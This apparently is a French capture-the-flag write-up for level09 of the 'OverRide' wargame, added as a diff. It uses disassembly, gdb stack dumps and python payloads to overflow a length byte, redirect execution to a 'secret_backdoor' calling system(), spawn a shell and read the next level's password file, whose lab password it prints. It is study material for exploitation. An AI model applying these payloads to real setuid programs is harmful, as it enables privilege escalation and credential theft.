@@ -1,0 +1,421 @@
+Le niveau 09 est un ELF 64-bit avec toutes les protections excepte le canary
+
+level09@OverRide:~$ file ./level09
+./level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+
+level09@OverRide:~$ strings ./level09
+	...
+>: Msg sent!
+>: Msg @Unix-Dude
+>>:
+>: Enter your username
+>: Welcome, %s
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+;*3$"
+	...
+
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+0x00000000000006f0  _init
+0x0000000000000720  strncpy
+0x0000000000000720  strncpy@plt
+0x0000000000000730  puts
+0x0000000000000730  puts@plt
+0x0000000000000740  system
+0x0000000000000740  system@plt
+0x0000000000000750  printf
+0x0000000000000750  printf@plt
+0x0000000000000760  __libc_start_main
+0x0000000000000760  __libc_start_main@plt
+0x0000000000000770  fgets
+0x0000000000000770  fgets@plt
+0x0000000000000780  __cxa_finalize
+0x0000000000000780  __cxa_finalize@plt
+0x0000000000000790  _start
+0x00000000000007bc  call_gmon_start
+0x00000000000007e0  __do_global_dtors_aux
+0x0000000000000860  frame_dummy
+0x000000000000088c  secret_backdoor
+0x00000000000008c0  handle_msg
+0x0000000000000932  set_msg
+0x00000000000009cd  set_username
+0x0000000000000aa8  main
+0x0000000000000ad0  __libc_csu_init
+0x0000000000000b60  __libc_csu_fini
+0x0000000000000b70  __do_global_ctors_aux
+0x0000000000000ba8  _fini
+
+On a visiblement une utilisation de system dans secret_backdoor
+
+000000000000088c <secret_backdoor>:
+ 88c:	55                   	push   rbp
+ 88d:	48 89 e5             	mov    rbp,rsp
+ 890:	48 83 c4 80          	add    rsp,0xffffffffffffff80
+ 894:	48 8b 05 1d 17 20 00 	mov    rax,QWORD PTR [rip+0x20171d]        # 201fb8 <_DYNAMIC+0x198>
+ 89b:	48 8b 00             	mov    rax,QWORD PTR [rax]
+ 89e:	48 89 c2             	mov    rdx,rax
+ 8a1:	48 8d 45 80          	lea    rax,[rbp-0x80]
+ 8a5:	be 80 00 00 00       	mov    esi,0x80
+ 8aa:	48 89 c7             	mov    rdi,rax
+ 8ad:	e8 be fe ff ff       	call   770 <fgets@plt>
+ 8b2:	48 8d 45 80          	lea    rax,[rbp-0x80]
+ 8b6:	48 89 c7             	mov    rdi,rax
+ 8b9:	e8 82 fe ff ff       	call   740 <system@plt>
+ 8be:	c9                   	leave
+ 8bf:	c3                   	ret
+
+Il n'est visiblement pas possible d'effectuer de buffer overflow ni de format string exploit.
+
+Allons donc inspecter le programme dans gdb.
+
+level09@OverRide:~$ gdb ./level09
+	...
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) display /5i $pc
+(gdb) b main
+Breakpoint 1 at 0xaac
+(gdb) r
+Starting program: /home/users/level09/level09
+
+Breakpoint 1, 0x0000555555554aac in main ()
+1: x/5i $pc
+=> 0x555555554aac <main+4>:	lea    rdi,[rip+0x15d]        # 0x555555554c10
+   0x555555554ab3 <main+11>:	call   0x555555554730 <puts@plt>
+   0x555555554ab8 <main+16>:	call   0x5555555548c0 <handle_msg>
+   0x555555554abd <main+21>:	mov    eax,0x0
+   0x555555554ac2 <main+26>:	pop    rbp
+
+(gdb)
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+0x0000555555554ab8 in main ()
+1: x/5i $pc
+=> 0x555555554ab8 <main+16>:	call   0x5555555548c0 <handle_msg>
+   0x555555554abd <main+21>:	mov    eax,0x0
+   0x555555554ac2 <main+26>:	pop    rbp
+   0x555555554ac3 <main+27>:	ret
+   0x555555554ac4:	nop
+
+(gdb) disass handle_msg
+Dump of assembler code for function handle_msg:
+=> 0x00005555555548c0 <+0>:	push   rbp
+   0x00005555555548c1 <+1>:	mov    rbp,rsp
+   0x00005555555548c4 <+4>:	sub    rsp,0xc0
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
+   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
+   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
+   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
+   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0
+   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c
+   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]
+   0x000055555555490d <+77>:	mov    rdi,rax
+   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
+   0x0000555555554915 <+85>:	lea    rax,[rbp-0xc0]
+   0x000055555555491c <+92>:	mov    rdi,rax
+   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
+   0x0000555555554924 <+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x000055555555492b <+107>:	call   0x555555554730 <puts@plt>
+   0x0000555555554930 <+112>:	leave
+   0x0000555555554931 <+113>:	ret
+End of assembler dump.
+
+Si nous essayons d'appeler secret_backdoor depuis gdb et de lancer system avec un argument exploitable, nous avons bien sur le probleme d'annulation des droits du programme avec le lancement de gdb.
+
+(gdb) x/x secret_backdoor
+0x55555555488c <secret_backdoor>:	0xe5894855
+
+Apres l'appel des deux fonctions set_, nous avons la stack sous cette forme.
+
+(gdb)
+>: Msg @Unix-Dude
+>>: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x0000555555554924 in handle_msg ()
+1: x/5i $pc
+=> 0x555555554924 <handle_msg+100>:
+    lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
+   0x555555554930 <handle_msg+112>:	leave
+   0x555555554931 <handle_msg+113>:	ret
+   0x555555554932 <set_msg>:	push   rbp
+(gdb) x/80x $rsp
+0x7fffffffe4b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4d0:	0x61616161	0x0000000a	0x00000000	0x00000000
+0x7fffffffe4e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x61616161
+0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe560:	0x0000000a	0x0000008c	0xffffe580	0x00007fff
+0x7fffffffe570:	0xffffe580	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe580:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe590:	0x00000000	0x00000000	0xffffe668	0x00007fff
+0x7fffffffe5a0:	0x55554000	0x00000001	0x55554aa8	0x00005555
+0x7fffffffe5b0:	0x00000000	0x00000000	0xf61a1080	0x5c8bf824
+0x7fffffffe5c0:	0x55554790	0x00005555	0xffffe660	0x00007fff
+0x7fffffffe5d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe5e0:	0x3d3a1080	0xa37407db	0x594a1080	0xa3741763
+
+On remarque que se trouve apres notre buffer set_username la taille du buffer de set_msg, et le buffer de set_msg se trouve avant sur la stack avec une taille plus grande comme le montre la source.
+
+On peut override l'octet taille suivant le premier buffer:
+
+(gdb) x/80x $rsp
+0x7fffffffe4b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4d0:	0x61616161	0x61616161	0x61616161	0x0000000a
+0x7fffffffe4e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe4f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe510:	0x00000000	0x00000000	0x55554c10	0x00005555
+0x7fffffffe520:	0xffffe660	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe530:	0xf7dd4260	0x00007fff	0xf7a9608f	0x61616161
+0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe560:	0x61616161	0x00000061	0xffffe580	0x00007fff
+0x7fffffffe570:	0xffffe580	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe580:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe590:	0x00000000	0x00000000	0xffffe668	0x00007fff
+
+Nous pouvons lui donner une taille suffisament grande pour override l'adresse qui parait adapte pour un exploit.
+
+(gdb) x/x 0x555555554abd
+0x555555554abd <main+21>:	0x000000b8
+
+Il faut donc exploiter le programme avec de l'hexa envoye par python et reecrire l'adresse cible pour changer la valeur qui sera rip sur la stack au moment voulu et appeler la fonction qui contient un system.
+
+level09@OverRide:~$ { python -c 'print("a" * 40 + "\xfa")' ; python -c 'print("a" * 204)' ; } | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+Segmentation fault (core dumped)
+
+level09@OverRide:~$ dmesg
+[ 7047.419065] level09[1959]: segfault at a61616161 ip 0000000a61616161 sp 00007fffffffe5a0 error 14 in level09[555555554000+1000]
+	...
+[ 5810.637095] traps: level09[1856] general protection ip:555555554931 sp:7fffffffe598 error:0 in level09[555555554000+1000]
+
+On segfault bien sur l'adresse de retour.
+
+(gdb)
+0x0000555555554931 in handle_msg ()
+1: x/5i $pc
+=> 0x555555554931 <handle_msg+113>:	ret
+
+(gdb) p secret_backdoor
+$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+level09@OverRide:~$ { python -c 'print("a" * 40 + "\xfa")' ; python -c 'print("a" * 200 + "\x8c\x48\x55\x55\x55\x55")' ; python -c 'print("/bin/sh")'; } > /tmp/testinput
+
+level09@OverRide:~$ gdb ./level09
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) display /5i $pc
+(gdb) r < /tmp/testinput
+
+(gdb)
+>: Enter your username
+0x0000555555554915 in handle_msg ()
+1: x/5i $pc
+=> 0x555555554915 <handle_msg+85>:	lea    rax,[rbp-0xc0]
+   0x55555555491c <handle_msg+92>:	mov    rdi,rax
+   0x55555555491f <handle_msg+95>:	call   0x555555554932 <set_msg>
+   0x555555554924 <handle_msg+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
+(gdb) x/60x $rsp
+0x7fffffffe4b0:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe4c0:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe4d0:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe4e0:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe4f0:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe500:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe510:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe520:	0xffffe660	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe530:	0xf7dd4260	0x00007fff	0xf7a9608f	0x61616161
+0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe560:	0x61616161	0x000000fa	0xffffe580	0x00007fff
+0x7fffffffe570:	0xffffe580	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe580:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe590:	0x00000000	0x00000000	0xffffe668	0x00007fff
+
+(gdb)
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+0x0000555555554924 in handle_msg ()
+1: x/5i $pc
+=> 0x555555554924 <handle_msg+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
+   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
+   0x555555554930 <handle_msg+112>:	leave
+   0x555555554931 <handle_msg+113>:	ret
+   0x555555554932 <set_msg>:	push   rbp
+(gdb) x/60x $rsp
+0x7fffffffe4b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe500:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe510:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe520:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe530:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe560:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe570:	0x61616161	0x61616161	0x5555488c	0x000a5555
+0x7fffffffe580:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe590:	0x00000000	0x00000000	0x00000000	0x00000000
+
+Il y a un caractere indesirable dans l'adresse de la stack (0a == '\n') qu'il faut retirer en rajoutant les \x00 de notre adresse dans le payload.
+
+...
+(gdb) x/60x $rsp
+0x7fffffffe4b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe4f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe500:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe510:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe520:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe530:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe560:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe570:	0x61616161	0x61616161	0x5555488c	0x00005555
+0x7fffffffe580:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe590:	0x00000000	0x00000000	0x00000000	0x00000000
+
+(gdb)
+0x0000555555554931 in handle_msg ()
+1: x/5i $pc
+=> 0x555555554931 <handle_msg+113>:	ret
+   0x555555554932 <set_msg>:	push   rbp
+   0x555555554933 <set_msg+1>:	mov    rbp,rsp
+   0x555555554936 <set_msg+4>:	sub    rsp,0x410
+   0x55555555493d <set_msg+11>:	mov    QWORD PTR [rbp-0x408],rdi
+
+(gdb) i r
+rax            0xd	13
+rbx            0x0	0
+rcx            0x7ffff7b01f90	140737348902800
+rdx            0x7ffff7dd5a90	140737351867024
+rsi            0x7ffff7ff7000	140737354100736
+rdi            0xffffffff	4294967295
+rbp            0x6161616161616161	0x6161616161616161
+rsp            0x7fffffffe578	0x7fffffffe578
+r8             0x7ffff7ff7004	140737354100740
+r9             0xc	12
+r10            0x7fffffffde20	140737488346656
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe660	140737488348768
+r14            0x0	0
+r15            0x0	0
+rip            0x555555554931	0x555555554931 <handle_msg+113>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+
+(gdb)
+0x000055555555488c in secret_backdoor ()
+1: x/5i $pc
+=> 0x55555555488c <secret_backdoor>:	push   rbp
+   0x55555555488d <secret_backdoor+1>:	mov    rbp,rsp
+   0x555555554890 <secret_backdoor+4>:	add    rsp,0xffffffffffffff80
+   0x555555554894 <secret_backdoor+8>:
+    mov    rax,QWORD PTR [rip+0x20171d]        # 0x555555755fb8
+   0x55555555489b <secret_backdoor+15>:	mov    rax,QWORD PTR [rax]
+
+Ce n'est pas l'rip qui est reecrit ici mais bien la valeur place dans la stack avant l'appel de la fonction handle_msg.
+
+(gdb)
+0x00005555555548b2 in secret_backdoor ()
+1: x/5i $pc
+=> 0x5555555548b2 <secret_backdoor+38>:	lea    rax,[rbp-0x80]
+   0x5555555548b6 <secret_backdoor+42>:	mov    rdi,rax
+   0x5555555548b9 <secret_backdoor+45>:	call   0x555555554740 <system@plt>
+   0x5555555548be <secret_backdoor+50>:	leave
+   0x5555555548bf <secret_backdoor+51>:	ret
+   ...
+(gdb) i r
+rax            0x7fffffffe4f8	140737488348408
+rbx            0x0	0
+rcx            0x7fffffffe4f8	140737488348408
+rdx            0x7ffff7dd5aa0	140737351867040
+rsi            0x7ffff7ff6103	140737354096899
+rdi            0x7fffffffe4f8	140737488348408
+rbp            0x7fffffffe578	0x7fffffffe578
+rsp            0x7fffffffe4f8	0x7fffffffe4f8
+r8             0x1	1
+r9             0x0	0
+r10            0x7fffffffde20	140737488346656
+r11            0x246	582
+r12            0x555555554790	93824992233360
+r13            0x7fffffffe660	140737488348768
+r14            0x0	0
+r15            0x0	0
+rip            0x5555555548b9	0x5555555548b9 <secret_backdoor+45>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/s 0x7fffffffe4f8
+0x7fffffffe4f8:	 "/bin/sh\n"
+
+level09@OverRide:~$ { python -c 'print("a" * 40 + "\xfa")' ; python -c 'print("a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00")' ; python -c 'print("/bin/sh\x00")'; } > /tmp/testinput
+
+level09@OverRide:~$ cat /tmp/testinput - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+
+level09@OverRide:~$ su end
+Password:
+end@OverRide:~$ pwd
+/home/users/end
+end@OverRide:~$ l
+end*
+end@OverRide:~$ xxd end
+0000000: 4747 2021 0a                             GG !.
+
+
+
+
+
+
+
+
+
+(
+ft_root@OverRide:~$ pwd
+/home/ft_root
+?)
